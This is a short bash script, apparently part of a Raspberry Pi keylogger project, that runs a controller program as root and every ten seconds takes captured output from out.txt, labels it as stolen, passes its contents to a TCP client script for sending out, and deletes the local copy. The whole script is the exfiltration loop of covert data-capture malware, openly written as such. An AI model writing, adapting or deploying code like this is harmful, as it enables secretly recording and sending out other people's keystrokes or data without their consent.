#!/bin/bash
# used to restart the process and loop the "report"

cd /home/pi/nicekl/
sudo python3 controller.py &

while true
do
  if [ -s out.txt ]; then
    # this loop is processed if the out.txt file has greater-than 0 size
    stolen_file=$(date +"%s.txt")
    # creates a unique value, renaming out.txt
    mv out.txt "$stolen_file"
    stolen_content=$(cat "$stolen_file")
    # launches the client TCP application while passing the contents of the file
    sudo python3 client.py "$stolen_content"
    rm -f "$stolen_file"
  fi
  # repeat this loop ever x seconds
  sleep 10
done
